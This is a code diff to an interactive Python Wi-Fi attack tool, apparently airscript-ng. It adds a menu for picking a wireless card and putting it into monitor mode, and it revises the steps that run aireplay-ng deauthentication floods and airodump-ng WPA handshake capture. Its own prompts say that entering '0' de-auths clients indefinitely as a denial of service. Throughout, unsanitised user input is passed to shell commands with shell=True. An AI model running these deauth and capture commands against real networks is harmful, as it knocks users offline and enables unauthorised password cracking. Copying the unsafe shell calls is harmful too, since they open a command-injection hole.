@@ -8,6 +8,34 @@ class col:
     endl = '\033[0m'
     bold = '\033[1m'
     uline = '\033[4m'
+    blue_deep = '\033[1;34;48m'
+    warn_deep = '\033[1;33;48m'
+    fail_deep = '\033[1;31;48m'
+def get_wifi_cards_pick():
+    import subprocess
+    iostream = subprocess.check_output
+    wireless_cards = []
+    index_array = []
+    def_range = iostream("ls /sys/class/net/ | grep ^wl | wc -l",shell=True).decode("utf-8").rstrip()
+    for i in range(1,int(def_range)+1):
+        wireless_cards.append(iostream("ls /sys/class/net/ | grep ^wl | head -n %s | tail -n 1" %(i),shell=True).decode("utf-8").rstrip())
+        index_array.append(i)
+        print("%sTo choose %s%s%s %senter %s[%s]%s" %(col.fail_deep,col.blue_deep,wireless_cards[i-1],col.endl,col.fail_deep,col.warn_deep,i,col.endl))
+    print("\n")
+    def get_card_name():
+        global index
+        index = ""
+        index = input("\033[1;33;48m[?] \033[1;35;48mWhat card shall I put in monitor-mode/use? \033[1;32;48m(enter no.) \033[1;35;48m>> ")
+        if index in [str(i) for i in index_array]:
+            index = wireless_cards[int(index)-1]
+            if input("Use %s? y/n > " %(index)).lower().startswith("y"):
+                subprocess.call("ip link set %s down;iw dev %s set type monitor;ip link set %s up" %(index,index,index),shell=True)
+                return index
+            else:
+                aircrackng()
+        else:
+            get_card_name()
+    get_card_name()
 def reaverspecialdeps():
     import os
     if os.system("ls ~/.airscriptNG/options.txt 2>/dev/null >/dev/null") != 0 or os.system("ls ~/.airscriptNG/ >/dev/null") != 0:
@@ -814,7 +842,7 @@ def aliasfunc(): #FIXES APPLIED, WITH SOME SACIFICE, REVIEW FINAL CODE.
         zcat = str(zcat)
         os.system("echo \"alias airscript-ng='python3 %s'\" >> ~/.bash_aliases && /bin/bash -c \"source ~/.bashrc\" " %(zcat))
         print("\n\033[1;32;48mAlias has been successfully added to ~/.bash_aliases.\033[0;39;48m")
-        print("Invoke this script from anywhere by typing \"airscript-ng\" \n")
+        print("Invoke this script from anywhere by typing \"airscript-ng\" as the root user\n")
         os._exit(1)
     else:
         os.system("clear")
@@ -949,12 +977,7 @@ def reaver():  #Needs major overhaul
             os.system("sudo systemctl stop NetworkManager.service")
             os.system("sudo systemctl stop wpa_supplicant.service")
             print("\033[1;32;48m[+] \033[0;37;48myour cards are:\n ")
-            os.system("ls /sys/class/net | grep ^wl")
-            print("\n")
-            global index
-            index = input("\033[1;33;48m[?] \033[1;35;48mWhat card shall I put in monitor-mode/use? \033[1;32;48m(copy/paste) \033[1;35;48m>> ")
-            index = str(index)
-            os.system("ip link set %s down;iw dev %s set type monitor;ip link set %s up" %(index,index,index))
+            get_wifi_cards_pick()
             print("\033[1;34;48m[info] \033[0;32;48mOk, seems like %s is started, time to get crackin'" %(index))
             print("\033[1;34;48m[info] \033[0;37;48mNow we'll run wash to find all the wps networks around")
             print("\033[1;34;48m[info] \033[0;33;48mPlease press CTRL+C once you see your target network")
@@ -1033,19 +1056,14 @@ def aircrackng(): #Lots of effort needed
                 print("Thanks for using this program")
                 os.system("sudo systemctl stop NetworkManager.service")
                 os.system("sudo systemctl stop wpa_supplicant.service")
-                print("\n\033[1;32;48m[+] \033[1;32;48myour cards are: \033[1;31;48m\n")
-                os.system("ls /sys/class/net | grep ^wl")
-                print("\n")
-                global index
-                index = input("\033[1;33;48m[?] \033[1;35;48mWhat card shall I put in monitor-mode/use? \033[1;32;48m(copy/paste) \033[1;35;48m>> ")
-                index = str(index)
-                os.system("ip link set %s down;iw dev %s set type monitor;ip link set %s up" %(index,index,index))
+                print("\n\033[1;32;48m[+] \033[1;32;48myour cards are: \033[0;39;48m\n")
+                get_wifi_cards_pick()
                 print("\n\033[1;34;48m[info] \033[1;37;48m1) Ok, seems like %s is in monitor mode" %(index))
                 print("\033[1;34;48m[info] \033[1;34;48m2) now, we'll run Airodump-ng to capture the handshake")
                 input("\033[1;34;48m[info] \033[1;33;48m3) once you start airodump, you need to press \033[1;32;48mCTRL+C\033[1;33;48m when you see your target network. \n\n\033[1;33;48m[?] press enter to continue >>")
                 os.system("airodump-ng -a %s" %(index)) 
                 print("\nOk, all I need is a few things from you")
-                b = input("\033[1;33;48m[?] \033[0;33;48mFirst, we'll create a new file to store the key in. What shall I call it? [no spaces/MAC addresses]>> ")
+                b = input("\033[1;33;48m[?] \033[0;33;48mFirst, can you give me a unique filename? [no spaces/punctuation/duplicate name]>> ")
                 b = str(b)
                 c = input("\033[1;33;48m[?] \033[0;34;48mNow, tell me the (copy/paste) channel {look at CH column} of the network [no spaces]>> ")
                 c = str(c)
@@ -1087,7 +1105,7 @@ def aircrackng(): #Lots of effort needed
                         global stda 
                         print("\033[1;32;48m[info] \033[1;39;48mHow many de-auths do you want to send to the client: %s? Typing '0' will de-auth indefinitely, creating a denial of service." %(g))
                         stda = input("\n\033[1;39;48mPlease enter a number. Around 3-5 is sufficient for a good WiFi-card.\033[1;31;48m ~# \033[0;39;48m")
-                        input("\n\033[1;33;48m[?] \033[1;37;48mONCE YOU SEE WPA HANDSHAKE:%s AT THE TOP RIGHT PRESS CTRL+C. \n\n[PRESS ENTER] \033[1;31;48m ~# \033[0;39;48m" %(d))
+                        input("\n\033[1;33;48m[?] \033[1;37;48mONCE YOU SEE WPA HANDSHAKE:%s AT THE TOP RIGHT, CLOSE THE WHITE WINDOW. \n\n[PRESS ENTER] \033[1;31;48m ~# \033[0;39;48m" %(d))
                         os.system("iwconfig %s channel %s" %(index,c))
                         os.system("xterm -geometry 100x25+4320+7640 -title 'DEAUTHING: %s & CAPTURING'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -e 'aireplay-ng -0 %s -a %s -c %s %s --ignore-negative-one && airodump-ng -w HANDSHAKES/%s -c %s --bssid %s --ignore-negative-one %s'" %(g,stda,d,g,index,b,c,d,index))
                         post_frame()
@@ -1096,7 +1114,7 @@ def aircrackng(): #Lots of effort needed
                         global brda 
                         print("\033[1;32;48m[info] \033[1;39;48mHow many de-auths do you want to send to all? Typing '0' will de-auth indefinitely, creating a denial of service.")
                         brda = input("\n\033[1;39;48mPlease enter a number. Around 3-5 is sufficient for a good WiFi-card.\033[1;31;48m ~# \033[0;39;48m")
-                        input("\n\033[1;33;48m[?] \033[1;39;48mONCE YOU SEE WPA HANDSHAKE:%s AT THE TOP RIGHT PRESS CTRL+C or close the window. \n\n[PRESS ENTER] \033[1;31;48m ~# \033[0;39;48m" %(d))
+                        input("\n\033[1;33;48m[?] \033[1;39;48mONCE YOU SEE WPA HANDSHAKE:%s AT THE TOP RIGHT, CLOSE THE WHITE WINDOWor close the window. \n\n[PRESS ENTER] \033[1;31;48m ~# \033[0;39;48m" %(d))
                         os.system("iwconfig %s channel %s" %(index,c))
                         os.system("xterm -geometry 100x25+4320+7640 -title 'DEAUTHING ALL & CAPTURING'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -e 'aireplay-ng -0 %s -a %s %s --ignore-negative-one && airodump-ng -w HANDSHAKES/%s -c %s --bssid %s --ignore-negative-one %s'" %(brda,d,index,b,c,d,index))
                         post_frame()
@@ -1104,7 +1122,7 @@ def aircrackng(): #Lots of effort needed
                         os.system('clear')
                         print("\n\033[1;37;48m[info] \033[1;39;48mYou have chosen not to disconnect anyone.")
                         print("\033[1;33;48m[info] \033[1;39;48mYou need to wait for someone to connect.")
-                        input("\n\033[1;36;48m[info] \033[0;33;48mREADY? HIT \033[1;32;48m[ENTER]\033[0;33;48m TO RUN. ONCE YOU SEE WPA HANDSHAKE:%s AT THE TOP RIGHT PRESS CTRL+C.\033[1;31;48m ~# \033[0;39;48m" %(d))
+                        input("\n\033[1;36;48m[info] \033[0;33;48mREADY? HIT \033[1;32;48m[ENTER]\033[0;33;48m TO RUN. ONCE YOU SEE WPA HANDSHAKE:%s AT THE TOP RIGHT, CLOSE THE WHITE WINDOW.\033[1;31;48m ~# \033[0;39;48m" %(d))
                         os.system("\niwconfig %s channel %s" %(index,c))
                         os.system("xterm -geometry 100x25+4320+7640 -title 'WAITING FOR HANDSHAKE' -bg '#FFFFFF' -fg '#000000' -e 'airodump-ng -w HANDSHAKES/%s -c %s --bssid %s --ignore-negative-one %s'" %(b,c,d,index))
                         post_frame()
